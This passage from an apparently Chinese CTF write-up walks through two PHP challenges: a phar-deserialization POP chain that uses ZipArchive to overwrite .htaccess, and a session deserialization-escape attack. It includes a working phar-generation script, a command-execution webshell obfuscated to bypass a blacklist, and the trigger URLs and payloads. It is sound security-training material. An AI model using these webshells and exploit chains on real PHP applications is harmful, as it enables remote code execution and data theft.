punctuation">}</span></code></pre><p>其实看到这么多魔术方法应该就往反序列化方向考虑。</p><p>看一下File类。</p><p>有可控参数filename和filepath，</p><p>在view_detail函数中对filepath做了一些有关伪协议的过滤。</p><p>然后通过mime_content_type函数对文件类型进行检测，重点就在于这个函数通过_php_finfo_get_type间接调用了关键函数php_stream_open_wrapper_ex,导致此处可以触发phar反序列化。</p><p>思路就是构造pop链删除或重写.htaccess/干脆换一个目录。</p><pre class=" language-php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">File</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$filepath</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$checker</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$filepath</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filepath</span> <span class="token operator">=</span> <span class="token variable">$filepath</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span> <span class="token operator">=</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">view_detail</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^(phar|compress|compose.zlib|zip|rar|file|ftp|zlib|data|glob|ssh|expect)/i'</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filepath</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"nonono~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$mine</span> <span class="token operator">=</span> <span class="token function">mime_content_type</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filepath</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$store_path</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filepath</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$res</span><span class="token punctuation">[</span><span class="token string">'mine'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$mine</span><span class="token punctuation">;</span>        <span class="token variable">$res</span><span class="token punctuation">[</span><span class="token string">'store_path'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$store_path</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$res</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$filepath</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token string">"$filename is in $filepath"</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$res</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">checker</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">checker</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">upload_file</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>继续向下看代码，思考如何构建链。File类的析构函数中checker调用了本类不存在的函数upload_file(),这让人想到_ _ call()方法，而Profile类中正好存在可利用的_ _call，在call方法中$admin调用了open方法。</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201025161531936.png" srcset="/img/loading.gif" alt="image-20201025161531936"></p><p>这是题目的open方法。这样看好像没什么出路了。</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201025163002411.png" srcset="/img/loading.gif" alt="image-20201025163002411"></p><p>但是类中的admin是可控的，如果我们将admin定义为php中一个内置类的对象，且这个类有open函数，功能是删除或更改文件信息就能达到目的。如图，搜到了ZipArchive类。</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201025175111185.png" srcset="/img/loading.gif" alt="image-20201025175111185"></p><p>参数：filename文件名，flags是打开文档的模式，这里的参数就选择这两个。</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201025180311424.png" srcset="/img/loading.gif" alt="image-20201025180311424"></p><p>综上进行phar文件构造，脚本如下：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">File</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$filepath</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$checker</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$filepath</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filepath</span> <span class="token operator">=</span> <span class="token variable">$filepath</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span> <span class="token operator">=</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">checker</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Profile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Profile</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$admin</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span> <span class="token operator">=</span>  <span class="token string">"/var/www/html/sandbox/479bfbc13b06e3588906f74bae9507c9/.htaccess"</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span> <span class="token operator">=</span> ZipArchive<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">OVERWRITE</span> <span class="token operator">|</span> ZipArchive<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">CREATE</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">admin</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ZipArchive</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token string">'aa'</span><span class="token punctuation">,</span><span class="token string">'aa'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>@<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string">"2.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string">"2.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string">"&lt;?php __HALT_COMPILER(); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string">"test.txt"</span><span class="token punctuation">,</span> <span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>先上传一个shell（因为每次访问upload都会重置.htaccess，为了使下面更改.htaccess操作生效）,check()里的黑名单用拼接形式绕过。</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201025191843151.png" srcset="/img/loading.gif" alt="image-20201025191843151"></p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token string">"syste"</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token string">"m"</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$a</span><span class="token punctuation">.</span><span class="token variable">$b</span><span class="token punctuation">;</span><span class="token variable">$d</span><span class="token operator">=</span><span class="token variable">$c</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token comment" spellcheck="true">//存储位置：./sandbox/479bfbc13b06e3588906f74bae9507c9/25a452927110e39a345a2511c57647f2.php</span></code></pre><p>记录存储位置</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201026112809109.png" srcset="/img/loading.gif" alt="image-20201026112809109"></p><p>上传phar文件，记录存储位置：./sandbox/479bfbc13b06e3588906f74bae9507c9/444a6fb20b7dbea9db85ca6b90f304cf.phar</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201026105602172.png" srcset="/img/loading.gif" alt="image-20201026105602172"></p><p>用php://filter/resource=phar://绕过伪协议过滤触发反序列化，执行对.htaccess的操作。</p><pre><code>view.php?filename=444a6fb20b7dbea9db85ca6b90f304cf.phar&amp;filepath=php://filter/resource=phar://sandbox/479bfbc13b06e3588906f74bae9507c9/444a6fb20b7dbea9db85ca6b90f304cf.phar</code></pre><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201026112509260.png" srcset="/img/loading.gif" alt="image-20201026112509260"></p><p>直接访问shell位置读取flag。</p><pre><code>/sandbox/479bfbc13b06e3588906f74bae9507c9/25a452927110e39a345a2511c57647f2.php?a=cat%20../../../../../../flag;</code></pre><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201026111950025.png" srcset="/img/loading.gif" alt="image-20201026111950025"></p><h1 id="安洵杯-2019-easy-serialize-php"><a href="#安洵杯-2019-easy-serialize-php" class="headerlink" title="[安洵杯 2019]easy_serialize_php"></a>[安洵杯 2019]easy_serialize_php</h1><p><strong>考点：反序列化逃逸</strong></p><p>分析源码</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$function</span> <span class="token operator">=</span> @<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment" spellcheck="true">//filter方法将目标参数中的'php','flag','php5','php4','fl1g'替换为空。</span>    <span class="token variable">$filter_arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'php'</span><span class="token punctuation">,</span><span class="token string">'flag'</span><span class="token punctuation">,</span><span class="token string">'php5'</span><span class="token punctuation">,</span><span class="token string">'php4'</span><span class="token punctuation">,</span><span class="token string">'fl1g'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$filter</span> <span class="token operator">=</span> <span class="token string">'/'</span><span class="token punctuation">.</span><span class="token function">implode</span><span class="token punctuation">(</span><span class="token string">'|'</span><span class="token punctuation">,</span><span class="token variable">$filter_arr</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'/i'</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$filter</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token variable">$img</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//替换和反序列很容易想到反序列化逃逸</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">unset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">"user"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'guest'</span><span class="token punctuation">;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'function'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$function</span><span class="token punctuation">;</span><span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//存在变量覆盖漏洞，user、function可控</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$function</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">'&lt;a href="index.php?f=highlight_file">source_code&lt;/a>'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'img_path'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'img'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token string">'guest_img.png'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//对img先sha1再base64</span>    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'img'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'img_path'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$serialize_info</span> <span class="token operator">=</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$function</span> <span class="token operator">==</span> <span class="token string">'highlight_file'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string">'index.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$function</span> <span class="token operator">==</span> <span class="token string">'phpinfo'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">'phpinfo();'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//maybe you can find something in here!</span><span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$function</span> <span class="token operator">==</span> <span class="token string">'show_image'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$userinfo</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$serialize_info</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//这只有个解base64的,那上面那种sha1加密过的肯定是不行了，得想办法把它替掉。</span>    <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$userinfo</span><span class="token punctuation">[</span><span class="token string">'img'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>还给了个phpinfo的提示，在其中找到了文件d0g3_f1ag.php。</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201208144329718.png" srcset="/img/loading.gif" alt="image-20201208144329718"></p><p>想法肯定是去控制img的值。</p><p>基础序列化</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">"user"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'user'</span><span class="token punctuation">;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'function'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'function'</span><span class="token punctuation">;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'img'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'img'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token operator">--</span><span class="token operator">--</span>输出<span class="token operator">-</span><span class="token operator">></span><span class="token property">a</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"user"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"user"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string">"function"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string">"function"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"img"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"img"</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>想要构造的值</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'img'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'ZDBnM19mMWFnLnBocA=='</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//d0g3_f1ag.php</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>输出<span class="token operator">-</span><span class="token operator">></span><span class="token property">a</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"img"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">:</span><span class="token string">"ZDBnM19mMWFnLnBocA=="</span><span class="token punctuation">;</span><span class="token punctuation">}</span>构造<span class="token operator">-</span><span class="token operator">></span><span class="token property">a</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token string">";s:3:"</span>img<span class="token string">";s:20:"</span>ZDBnM19mMWFnLnBocA<span class="token operator">==</span>"<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>将构造的值赋给function。</p><pre class=" language-php"><code class="language-php">a<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"user"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"user"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string">"function"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">46</span><span class="token punctuation">:</span><span class="token string">"a:1:{"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"img"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">:</span><span class="token string">"ZDBnM19mMWFnLnBocA=="</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token string">";s:3:"</span>img<span class="token string">";s:3:"</span>img"<span class="token punctuation">;</span><span class="token punctuation">}</span>filter替换后<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">></span>a<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"user"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">""</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string">"function"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">46</span><span class="token punctuation">:</span><span class="token string">"a:1:{"</span><span class="token punctuation">;</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">></span>双引号内<span class="token number">28</span>个字符，那这里需要<span class="token number">7</span>个flags<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"img"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">:</span><span class="token string">"ZDBnM19mMWFnLnBocA=="</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token string">";s:3:"</span>img<span class="token string">";s:3:"</span>img"<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">></span>丢掉</code></pre><p>但问题来了，这正常应该有三个值，这里只有两个。所以重新进行构造：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'img'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'ZDBnM19mMWFnLnBocA=='</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//d0g3_f1ag.php</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'dwm2'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'hhh'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token operator">--</span><span class="token operator">--</span>输出<span class="token operator">-</span><span class="token operator">></span><span class="token property">a</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"img"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">:</span><span class="token string">"ZDBnM19mMWFnLnBocA=="</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"dwm2"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"hhh"</span><span class="token punctuation">;</span><span class="token punctuation">}</span>构造<span class="token operator">-</span><span class="token operator">></span><span class="token property">a</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token string">";s:3:"</span>img<span class="token string">";s:20:"</span>ZDBnM19mMWFnLnBocA<span class="token operator">==</span><span class="token string">";s:4:"</span>dwm2<span class="token string">";s:3:"</span>hhh"<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>再赋给function,这样就可以成功读到。</p><pre class=" language-php"><code class="language-php">a<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"user"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">28</span><span class="token punctuation">:</span><span class="token string">"flagflagflagflagflagflagflag"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string">"function"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">67</span><span class="token punctuation">:</span><span class="token string">"a:2:{"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"img"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">:</span><span class="token string">"ZDBnM19mMWFnLnBocA=="</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"dwm2"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"hhh"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token string">";s:3:"</span>img<span class="token string">";s:3:"</span>img"<span class="token punctuation">;</span><span class="token punctuation">}</span>替换后<span class="token operator">--</span><span class="token operator">-</span><span class="token operator">></span>a<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"user"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">28</span><span class="token punctuation">:</span><span class="token string">""</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string">"function"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">67</span><span class="token punctuation">:</span><span class="token string">"a:2:{"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"img"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">:</span><span class="token string">"ZDBnM19mMWFnLnBocA=="</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"dwm2"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"hhh"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token string">";s:3:"</span>img<span class="token string">";s:3:"</span>img"<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token operator">--</span><span class="token operator">></span>丢掉</code></pre><p>payload</p><pre class=" language-php"><code class="language-php"><span class="token constant">GET</span><span class="token punctuation">:</span><span class="token operator">?</span>f<span class="token operator">=</span>show_image<span class="token constant">POST</span><span class="token punctuation">:</span><span class="token constant">_SESSION</span><span class="token punctuation">[</span>user<span class="token punctuation">]</span><span class="token operator">=</span>flagflagflagflagflagflagflag     <span class="token constant">_SESSION</span><span class="token punctuation">[</span><span class="token keyword">function</span><span class="token punctuation">]</span><span class="token operator">=</span>a<span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token string">";s:3:"</span>img<span class="token string">";s:20:"</span>ZDBnM19mMWFnLnBocA<span class="token operator">==</span><span class="token string">";s:4:"</span>dwm2<span class="token 